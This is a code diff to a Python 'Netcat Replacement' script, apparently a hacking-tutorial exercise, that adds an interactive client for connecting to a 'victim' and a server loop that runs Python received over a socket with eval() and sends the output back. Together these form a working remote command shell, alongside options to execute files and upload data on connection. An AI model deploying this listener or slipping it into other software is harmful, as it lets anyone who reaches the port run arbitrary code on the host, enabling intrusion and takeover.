@@ -2,6 +2,7 @@ import threading
 import sys
 import socket
 import getopt
+from io import StringIO
 
 
 # define some global variables
@@ -16,11 +17,11 @@ upload_destination = ""
 
 def usage():
     print("Netcat Replacement")
-    print("Usage: nc.py -t target_host:port")
+    print("Usage: nc.py -t target_host -p port")
     print(
         "-l --listen                - listen on [host]:[port] for incoming connections")
-    print("-e --execute=file_to_run   - execute the given file upon receiving a connection")
-    print("-c --command               - initialize a python interactive shell")
+    print("-e --execute=file_to_run   - execute a Python file upon receiving a connection (Option required for both ends)")
+    print("-c --command               - initialize a Python interactive shell to connection (Option required for both ends)")
     print(
         "-u --upload=destination    - upon receiving connection upload a file and write to [destination]")
     print("Examples: ")
@@ -62,24 +63,38 @@ for o, a in opts:
         assert False, "Unhandled Option"
 
 
-# Feature to connect to victim
-def client_sender(buffer):
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((target, port))
-    print("[*]Successfully connected to {}:{}".format(target, port))
-    s.send(buffer)
-
-
-# are we going to listen or just send data from stdin
+# connect to victim
 if not listen and len(target) and port > 0:
+    if command:
+        # read in the buffer from the commandline
+        # this will block, so send CTRL-D if not sending input
+        # to stdin
+        # buffer = sys.stdin.read()
+        # buffer = buffer.encode('utf8')
 
-    # read in the buffer from the commandline
-    # this will block, so send CTRL-D if not sending input
-    # to stdin
-    buffer = sys.stdin.read()
-    buffer = buffer.encode('utf8')
-    # send data off
-    client_sender(buffer)
+        # establish a socket
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target, port))
+        print("[*]Successfully connected to {}:{}".format(target, port))
+
+        # open a new thread for receving data
+        def recv_n_print():
+            while True:
+                data = s.recv(4096)
+                data = data.decode('utf8')
+                print(data)
+        t = threading.Thread(target=recv_n_print)
+        t.start()
+
+        while True:
+            # input command
+            cmd = input(">>>")
+            if cmd == '':
+                cmd = '\n'    # handle line change correctly
+            cmd = cmd.encode('utf8')
+
+            # send data off
+            s.send(cmd)
 
 
 def server_loop():
@@ -95,7 +110,19 @@ def server_loop():
             while True:
                 cmd = client_socket.recv(4096)  # receive data
                 cmd = cmd.decode('utf8')
-                eval(cmd)  # eval Python statements
+                if cmd != '':
+                    try:
+                        old_stdout = sys.stdout
+                        sys.stdout = mystdout = StringIO()
+                        eval(cmd)
+                        sys.stdout = old_stdout
+                        result = mystdout.getvalue()    # get the result of eval()
+                        result = result.encode('utf8')
+                        # print(result)
+                        client_socket.send(result)      # send off result
+                    except Exception as e:
+                        client_socket.send(str(e).encode('utf8'))
+        # DOTO
 
     while True:
         client_socket, client_addr = server_socket.accept()
